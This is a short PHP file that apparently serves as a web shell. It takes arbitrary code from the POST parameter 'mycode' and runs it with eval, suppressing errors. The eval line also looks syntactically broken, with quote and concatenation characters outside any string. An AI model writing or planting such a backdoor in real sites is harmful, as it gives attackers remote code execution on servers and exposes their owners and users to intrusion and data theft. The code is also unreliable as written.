<?php
$AVuln = $_POST['mycode'];
@eval(@base64_decode(\''.base64_encode($AVuln)));
?>